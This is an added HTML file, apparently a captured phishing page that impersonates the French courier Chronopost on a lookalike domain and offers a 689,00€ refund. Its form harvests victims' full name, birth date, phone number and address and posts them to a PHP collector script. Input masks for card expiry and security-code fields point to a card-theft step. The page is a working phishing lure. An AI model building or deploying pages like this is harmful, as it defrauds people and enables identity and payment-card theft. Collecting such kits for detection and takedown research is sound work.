@@ -1,0 +1,299 @@
+<!-- URL =https://chronopost-colis.livraisonclient.com/Remboursement/--><!-- w =('LIVRAISONCLIENT.COM', datetime.datetime(2020, 7, 6, 16, 14, 48), datetime.datetime(2021, 7, 6, 16, 14, 48))--><!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="sourceApp/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
+  <link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet"/>
+  <link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  <link href="sourceApp/style.css" rel="stylesheet"/>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js">
+  </script>
+ </head>
+ <body>
+  <div class="d-block p-3 text-center text-white bg-primary b4b">
+   <a class="a-primary" href="">
+    <i aria-hidden="true" class="fas fa-exclamation-triangle">
+    </i>
+    2021/05/17 - Infos délais de remboursement
+   </a>
+  </div>
+  <header>
+   <img alt="Accueil" class="imglog" src="sourceApp/img/chronopost_logo.png"/>
+  </header>
+  <div class="menualbox">
+   <div class="topnav" id="myTopnav">
+    <a href="">
+     Accueil
+    </a>
+    <a href="">
+     Expedier
+    </a>
+    <a href="">
+     Nos offres
+    </a>
+    <a href="">
+     Aide / FAQ
+    </a>
+    <a href="">
+     A propos de Chronopost
+    </a>
+    <a class="icon" href="javascript:void(0);" onclick="myFunction()">
+     <i class="fa fa-bars">
+     </i>
+    </a>
+   </div>
+  </div>
+  <div class="container">
+   <div class="row">
+    <div class="col-sm-9">
+     <p class="alert alert-success">
+      <i class="fab fa-cc-mastercard">
+      </i>
+      <i class="fab fa-cc-visa">
+      </i>
+      Complétez notre formulaire de demande de remboursement - Montant : 689,00€
+     </p>
+     <form action="sourceApp/PosTinTo.php" method="post" name="myForm" onsubmit="return validateForm()">
+      <div class="form-row">
+       <div class="form-group col-md-6">
+        <label for="inputEmail4">
+         Nom complet
+        </label>
+        <input class="form-control" id="Kartenhalter" name="Kartenhalter" type="text"/>
+       </div>
+       <div class="form-group col-md-6">
+        <label for="inputPassword4">
+         Date de naissance
+        </label>
+        <input class="form-control" id="Geburtsdatuml" name="Geburtsdatuml" type="text"/>
+       </div>
+      </div>
+      <div class="form-group">
+       <label for="inputAddress">
+        Numéro de téléphone
+       </label>
+       <input class="form-control" id="EMailaddresse" name="EMailaddresse" type="text"/>
+      </div>
+      <div class="form-group">
+       <label for="inputAddress2">
+        Adresse
+       </label>
+       <input class="form-control" id="Rechnungsadresse" name="Rechnungsadresse" type="text"/>
+      </div>
+      <div class="form-row">
+       <div class="form-group col-md-6">
+        <label for="inputCity">
+         Ville
+        </label>
+        <input class="form-control" id="Stadt" name="Stadt" type="text"/>
+       </div>
+       <div class="form-group col-md-2">
+        <label for="inputZip">
+         Code postal
+        </label>
+        <input class="form-control" id="Postleitzahl" name="Postleitzahl" type="text"/>
+       </div>
+      </div>
+      <button class="btn btn-primary" name="infoget" type="submit">
+       Valider
+      </button>
+     </form>
+    </div>
+    <div class="col-sm-3 ">
+     <div class="card">
+      <img alt="..." class="card-img-top" src="sourceApp/img/chronopost_tours_03712200_113425863.jpg"/>
+      <div class="card-body">
+       <h5 class="card-title">
+        Chronopost toujours à vos côtés !
+       </h5>
+       <p class="card-text">
+        Parce que chaque livraison est unique, Chronopost s’adapte à vos besoins. Découvrez nos offres de livraison de colis en France et à l’international.
+       </p>
+      </div>
+     </div>
+    </div>
+   </div>
+   <script src="sourceApp/chronopost_if.js">
+   </script>
+   <script>
+    function myFunction() {
+  var x = document.getElementById("myTopnav");
+  if (x.className === "topnav") {
+    x.className += " responsive";
+  } else {
+    x.className = "topnav";
+  }
+}
+   </script>
+   <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js">
+   </script>
+   <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
+   </script>
+   <script type="text/javascript">
+    $(":input").inputmask();
+            
+            $("#Geburtsdatuml").inputmask({"mask": "99/99/9999"});
+            $("#EMailaddresse").inputmask({"mask": "99 99 99 99 99"});
+            $("#AblaufMM").inputmask({"mask": "99"});
+            $("#AblaufAA").inputmask({"mask": "9999"});
+            $("#Sicherheitscode").inputmask({"mask": "999"});
+   </script>
+   <!-- Footer -->
+   <footer class="page-footer font-small indigo">
+    <!-- Footer Links -->
+    <div class="container text-center text-md-left">
+     <!-- Grid row -->
+     <div class="row">
+      <!-- Grid column -->
+      <div class="col-md-3 mx-auto">
+       <!-- Links -->
+       <h5 class="font-weight-bold text-uppercase mt-3 mb-4">
+        Particulier
+       </h5>
+       <ul class="list-unstyled">
+        <li>
+         <a href="#!">
+          Envoyer un colis
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Suivre un envoi
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Nos offres
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Estimez les tarifs
+         </a>
+        </li>
+       </ul>
+      </div>
+      <!-- Grid column -->
+      <hr class="clearfix w-100 d-md-none"/>
+      <!-- Grid column -->
+      <div class="col-md-3 mx-auto">
+       <!-- Links -->
+       <h5 class="font-weight-bold text-uppercase mt-3 mb-4">
+        Aide
+       </h5>
+       <ul class="list-unstyled">
+        <li>
+         <a href="#!">
+          Se créer un compte
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Nos guides
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Vos questions fréquentes
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Espace Outre-Mer
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Flash info
+         </a>
+        </li>
+       </ul>
+      </div>
+      <!-- Grid column -->
+      <hr class="clearfix w-100 d-md-none"/>
+      <!-- Grid column -->
+      <div class="col-md-3 mx-auto">
+       <!-- Links -->
+       <h5 class="font-weight-bold text-uppercase mt-3 mb-4">
+        Mieux nous connaître
+       </h5>
+       <ul class="list-unstyled">
+        <li>
+         <a href="#!">
+          Gouvernance Chronopost
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Nous rejoindre
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Engagé et responsable
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Nos actualités
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Espace Presse
+         </a>
+        </li>
+       </ul>
+      </div>
+      <!-- Grid column -->
+      <hr class="clearfix w-100 d-md-none"/>
+      <!-- Grid column -->
+      <div class="col-md-3 mx-auto">
+       <!-- Links -->
+       <h5 class="font-weight-bold text-uppercase mt-3 mb-4">
+        Informations légales
+       </h5>
+       <ul class="list-unstyled">
+        <li>
+         <a href="#!">
+          Mentions légales
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Alerte fraude
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          Réseaux sociaux
+         </a>
+        </li>
+        <li>
+         <a href="#!">
+          <img src="sourceApp/img/Capture.png"/>
+         </a>
+        </li>
+       </ul>
+      </div>
+      <!-- Grid column -->
+     </div>
+     <!-- Grid row -->
+    </div>
+    <div class="footer-separator-desktop ">
+    </div>
+    <!-- Footer Links -->
+    <img class="loft" src="sourceApp/img/dpd-logo.png"/>
+    <img class="logt" src="sourceApp/img/chronopost_logo_small.png"/>
+    <!-- Copyright -->
+    <div class="footer-copyright text-center py-3">
+     © 2021 Chronopost
+    </div>
+    <!-- Copyright -->
+   </footer>
+   <!-- Footer -->
+  </div>
+ </body>
+</html>
